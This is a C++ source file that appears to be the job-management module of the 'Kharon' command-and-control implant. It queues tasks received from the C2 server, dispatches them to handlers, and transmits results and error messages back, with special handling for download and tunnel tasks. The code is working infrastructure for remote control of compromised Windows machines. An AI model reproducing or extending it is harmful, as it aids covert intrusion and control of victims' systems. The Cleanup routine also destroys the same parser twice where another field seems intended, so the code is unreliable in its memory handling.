#include <Kharon.h>

auto DECLFN Jobs::Create(
    _In_ CHAR*   UUID, 
    _In_ PARSER* Parser,
    _In_ BOOL    IsResponse
) -> JOBS* {
    JOBS*   NewJob = (JOBS*)hAlloc( sizeof( JOBS ) );
    PARSER* JobPsr = (PARSER*)hAlloc( sizeof( PARSER ) );

    if ( ! NewJob || ! JobPsr ) {
        if ( NewJob ) hFree( NewJob );
        if ( JobPsr ) hFree( JobPsr );
        return nullptr;
    }

    ULONG Length = 0;
    PVOID Data   = nullptr;
    
    if ( IsResponse ) {
        Self->Psr->Pad( Parser, Length );
        Length = Parser->Length;
        Data   = Parser->Buffer;
        NewJob->Destroy = Parser;
    } else {
        Length = 0;
        Data   = Self->Psr->Bytes( Parser, &Length );
    }

    KhDbg( "data at %p [%d bytes] to parse", Data, Length );
    
    Self->Psr->New( JobPsr, Data, Length );

    ULONG cmdID = Self->Psr->Int16( JobPsr );

    NewJob->ExitCode = -1;
    NewJob->State    = KH_JOB_PRE_START;
    NewJob->CmdID    = cmdID;
    NewJob->UUID     = UUID;
    NewJob->Psr      = JobPsr;
    NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
    NewJob->Clean    = TRUE;
    NewJob->PersistTriggered = FALSE;


    if ( ! NewJob->Pkg ) {
        hFree( NewJob );
        hFree( JobPsr );
        return nullptr;
    }

    KhDbg( "adding job with uuid: %s and command id: %d", NewJob->UUID, NewJob->CmdID );

    if ( !List ) {
        List = NewJob;
    } else {
        JOBS* Current = List;
        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next = NewJob;
    }
    
    Count++;

    KhDbg( "total jobs: %d", Count );

    return NewJob;
}

auto DECLFN Jobs::Send(
    _In_ PACKAGE* PostJobs
) -> VOID {
    JOBS* Current = List;

    BYTE*  Data   = nullptr;
    UINT64 Lenght = 0;

    while ( Current ) {
        if ( 
            Current->State    == KH_JOB_READY_SEND &&
            Current->ExitCode == EXIT_SUCCESS
        ) {
            KhDbg( "concatenating job: %s", Current->UUID );
            KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );

            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
            Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );

            Current->State = KH_JOB_TERMINATE;
            if( ! Current->Clean ){
                Current->State = KH_JOB_RUNNING;
                Self->Pkg->Destroy( Current->Pkg );
                Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
            }
        } else if ( 
            Current->State    == KH_JOB_READY_SEND && 
            Current->ExitCode != EXIT_SUCCESS      &&
            Current->ExitCode != -1
        ) {
            PCHAR Unknown  = "unknown error";
            PCHAR ErrorMsg = nullptr;
            ULONG Flags    = FORMAT_MESSAGE_ALLOCATE_BUFFER | 
                             FORMAT_MESSAGE_FROM_SYSTEM     | 
                             FORMAT_MESSAGE_IGNORE_INSERTS;
            
            ULONG MsgLen = Self->Krnl32.FormatMessageA(
                Flags, NULL, Current->ExitCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
                (LPSTR)&ErrorMsg, 0, NULL
            );

            MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );

            ULONG PkgLen = MsgLen + 2 + 40 + sizeof( INT16 ) + sizeof( INT32 );

            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
            Self->Pkg->Int32( PostJobs, PkgLen );

            Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
            Self->Pkg->Int16( PostJobs, Enm::Task::Error );
            Self->Pkg->Int32( PostJobs, Current->ExitCode );

            if ( MsgLen > 0 && ErrorMsg ) {
                Self->Pkg->Str( PostJobs, ErrorMsg );
                Self->Krnl32.LocalFree( ErrorMsg );
            } else {
                Self->Pkg->Str( PostJobs, Unknown );
            }

            Current->State = KH_JOB_TERMINATE;
        }
        
        Current = Current->Next;
    }
    
    Self->Pkg->Transmit( PostJobs, (PVOID*)0, 0 );

    return;
}

auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
    JOBS* Current  = this->List;
    JOBS* Previous = nullptr;

    while ( Current ) {
        if ( Current->State == KH_JOB_TERMINATE ) {
            JOBS* ToRemove = Current;
             
            if ( Previous ) {
                Previous->Next = Current->Next;
                Current        = Current->Next;
            } else {
                this->List = Current->Next;
                Current    = this->List;
            }

            if ( ToRemove->Pkg ) {
                Self->Pkg->Destroy( ToRemove->Pkg );
            }
            
            if ( ToRemove->Psr ) {
                Self->Psr->Destroy( ToRemove->Psr );
            }

            if ( ToRemove->Destroy ) {
                Self->Psr->Destroy( ToRemove->Psr );
            }

            hFree( ToRemove );
            
            Count--;
        } else {
            Previous = Current;
            Current  = Current->Next;
        }
    }
}

auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
    JOBS* Current = this->List;
    LONG  FlagRet = 0;

    while ( Current ) {
        if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
            if(!Current->PersistTriggered && (Current->CmdID == Enm::Task::ProcessDownloads || Current->CmdID == Enm::Task::ProcessTunnels )){
                KhDbg("Persist Triggered for job: %s", Current->UUID);
                Current->PersistTriggered = TRUE;
                Current = Current->Next;
                continue;
            }
            KhDbg( "executing task UUID : %s", Current->UUID );
            KhDbg( "executing command id: %d", Current->CmdID );

            FlagRet = 1;

            Self->Pkg->Shared = Current->Pkg;
            Self->Psr->Shared = Current->Psr;

            this->CurrentUUID  = Current->UUID;
            this->CurrentCmdId = Current->CmdID;
            Current->State     = KH_JOB_RUNNING;
            ERROR_CODE Result  = Self->Jbs->Execute( Current );
            Current->ExitCode  = Result;
            Current->State     = KH_JOB_READY_SEND;

            KhDbg( "job executed with exit code: %d, shouldClean: %d", Current->ExitCode, Current->Clean );
        }

        Current = Current->Next;
    }

    return FlagRet;
}

auto DECLFN Jobs::Execute(
    _In_ JOBS* Job
) -> ERROR_CODE {
    G_KHARON

    for ( INT i = 0; i < TSK_LENGTH; i++ ) {
        if ( Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
            return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
        }
    }

    // KH_ERROR_INVALID_TASK_ID
    return -2;
}

auto DECLFN Jobs::GetByUUID(
    _In_ CHAR* UUID
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Str::CompareA( Current->UUID, UUID ) == 0 ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::GetByID(
    _In_ ULONG ID
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Current->CmdID == ID ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::Remove(
    _In_ JOBS* Job
) -> BOOL {
    if ( !this->List ) return FALSE;
    
    if ( this->List == Job ) {
        this->List = Job->Next;
    } else {
        JOBS* Current = this->List;
        while ( Current->Next && Current->Next != Job ) {
            Current = Current->Next;
        }
        
        if ( Current->Next == Job ) {
            Current->Next = Job->Next;
        } else {
            return FALSE;
        }
    }
    
    hFree( Job );
    this->Count--;

    return TRUE;
}
